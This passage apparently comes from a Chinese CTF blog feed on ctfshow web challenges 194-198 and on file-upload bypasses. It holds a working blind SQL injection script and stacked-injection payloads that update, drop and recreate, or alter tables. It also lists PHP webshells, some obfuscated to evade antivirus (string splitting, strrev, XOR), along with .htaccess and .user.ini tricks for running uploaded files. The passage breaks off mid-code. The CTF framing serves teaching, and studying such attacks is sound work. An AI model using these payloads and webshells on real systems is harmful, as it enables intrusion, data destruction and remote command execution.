data-num=\"2\"></td><td><pre>Author       : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Github       : https://github.com/dpm12345</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Date         : 2023-07-15 17:17:55</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>LastEditors  : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>LastEditTime : 2023-07-15 18:05:57</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Description  : </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pwd <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>str_set <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>punctuation </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://d6c927bd-730c-4a1c-a8d0-de2deaca515b.challenge.ctf.show/api/\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    left <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    right <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">while</span> left <span class=\"token operator\">&lt;</span> right<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">+</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token comment\"># payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token comment\"># payload = \"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(f1ag) from ctfshow_fl0g\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token string\">\"username\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"admin' and if(ord(substr((</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>payload<span class=\"token punctuation\">}</span></span><span class=\"token string\">),</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1)) &gt; </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>mid<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1,2) ='1\"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token string\">\"password\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\"># print(data)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span>  <span class=\"token operator\">==</span> res<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            left <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            right <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>left<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"result:\"</span><span class=\"token punctuation\">,</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr></tbody></table></figure><h1 id=\"web-195\"><a class=\"anchor\" href=\"#web-195\">#</a> web 195</h1>\n<p>查询语句</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select pass from ctfshow_user where username = <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">}</span></span>;\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>返回逻辑</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 密码检测</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'密码只能为数字'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 密码判断</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'登陆成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\'|\\\"|select|union|or|and|\\x26|\\x7c|file|into/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"登陆成功 flag is <span class=\"token interpolation\"><span class=\"token variable\">$flag</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>可以使用修改表的方法</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">update</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>ctfshow_user<span class=\"token punctuation\">`</span></span><span class=\"token keyword\">set</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr></tbody></table></figure><p>将密码重置为 1</p>\n<h1 id=\"web-197\"><a class=\"anchor\" href=\"#web-197\">#</a> web 197</h1>\n<p>查询语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"select pass from ctfshow_user where username = {$username};\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>返回逻辑</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/\\*|\\#\\-|\\x23|\\'|\\\"|union|or|and|\\x26|\\x7c|file|into|select|update|set//i'</span><span class=\"token punctuation\">,</span>$username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>{</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'用户名非法'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    die<span class=\"token punctuation\">(</span>json_encode<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>}</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token keyword\">row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">=</span> $password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>{</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"登陆成功 flag is $flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>}</pre></td></tr></tbody></table></figure><p>在这一题中，与前面相比过滤了 update，不能更新，分号还是可以用，即堆叠注入还是可以用，所以不妨直接删除表，然后创建相同名字、字段的表，而数据自己设置</p>\n<p>因此 payload 为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">drop</span> <span class=\"token keyword\">table</span> ctfshow_user<span class=\"token punctuation\">;</span><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> ctfshow_user<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">insert</span> ctfshow_user<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">value</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"web-198\"><a class=\"anchor\" href=\"#web-198\">#</a> web 198</h1>\n<p>相比于 197 而言，将 <code>drop</code>  和 <code>create</code>  过滤了</p>\n<p>这里可以使用交换列的方法 (前提是知道用户名是什么), 因为在交换了两列之后，查询语句就变为查询原来的 <code>pass</code>  列，而匹配的密码为原来的 <code>username</code>  列，而 <code>username</code>  是知道的，那么即可拿到 flag</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass2<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass2<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/592e5fba/",
            "url": "http://dpm12345.cn/posts/592e5fba/",
            "title": "文件上传",
            "date_published": "2022-10-04T14:14:40.000Z",
            "content_html": "<h1 id=\"情况\"><a class=\"anchor\" href=\"#情况\">#</a> 情况</h1>\n<ul>\n<li>\n<p>仅仅有前端验证，将前端代码删去一些</p>\n</li>\n<li>\n<p>后端仅验证后缀，改后缀</p>\n</li>\n<li>\n<p>后端仅验证 <code>content-type</code> ，改为可以上传的内容类型</p>\n</li>\n<li>\n<p>后端验证内容头，输入一个要求上传格式的内容头</p>\n</li>\n<li>\n<p>后端验证文件内容，如 <code>php</code>  过滤，可以使用短标签</p>\n</li>\n<li>\n<p>用户配置文件可以上传，采用 <code>auto_append_file=1.txt</code> ，(前提是有默认 <code>index.php</code>  可以打开) 然后在 <code>1.txt</code>  内容进行控制</p>\n</li>\n<li>\n<p>内容不允许有方括号，即普通的一句话木马不能上传，可以将方括号改为大括号</p>\n</li>\n<li>\n<p>一句话木马也可写成 <code>&lt;?php eval (array_pop ($_POST));?&gt;</code> , 同样也可</p>\n</li>\n<li>\n<p>过滤括号可以使用文件包含的，因为文件包含可以不写括号</p>\n</li>\n<li>\n<p>如果对某一字符串进行过滤，可以采用分开写的方式绕过，如日志包含过滤了 log，那么可以写成 <code>&lt;?=include '/var/l'.'og/nginx/access.l'.'og?&gt;</code></p>\n</li>\n<li>\n<p>空格过滤，可以使用换行代替（十六进制下用 <code>0d</code> ）</p>\n</li>\n<li>\n<p>过滤点号后，由于此时不能包含任何一个带点的文件 (如 log), 那么此时也可以使用远程 url 包含，先上传一个 <code>.user.ini</code>  自动加载没有点作为名字的文件，然后在该文件上传一个远程包含 url (其中 url 有一句话木马，该 url 为常地址不带点)，那么就可以 rce 了；另外也可以使用 session 包含竞争</p>\n</li>\n<li>\n<p>若无法上传出配置文件以外的文件 (即删除)，可以在配置文件中直接远程包含文件 (url)</p>\n</li>\n<li>\n<p>PNG 二次渲染</p>\n</li>\n<li>\n<p>jpg 二次渲染</p>\n</li>\n<li>\n<p>上传 <code>.htaccess</code>  文件，将某类型文件作为 php 文件读取</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>AddType application/x-httpd-php .png</pre></td></tr></tbody></table></figure><p>或者</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;FilesMatch \"png\"&gt; </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>SetHandler application/x-httpd-php </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;/FilesMatch&gt;</pre></td></tr></tbody></table></figure><figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;script language='php'&gt;eval($_POST[cmd]);&lt;/script&gt;</pre></td></tr></tbody></table></figure></li>\n<li>\n<p>xxxxxxxxxx1&nbsp;1?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<p><strong>web 167-170</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"s#y#s#t#e#m\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"#\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1s'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'ystem'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'metsys'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>更多的关于免杀</p>\n<ol>\n<li>\n<p>字符串拼接</p>\n</li>\n<li>\n<p>利用异或，使用其他符号构建字符串 如</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'!'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'#'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&amp;'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//ABCDEFG</span></pre></td></tr></tbody></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span>  <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$a</span></span>(<span class=\"token interpolation\"><span class=\"token variable\">$b</span></span>)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 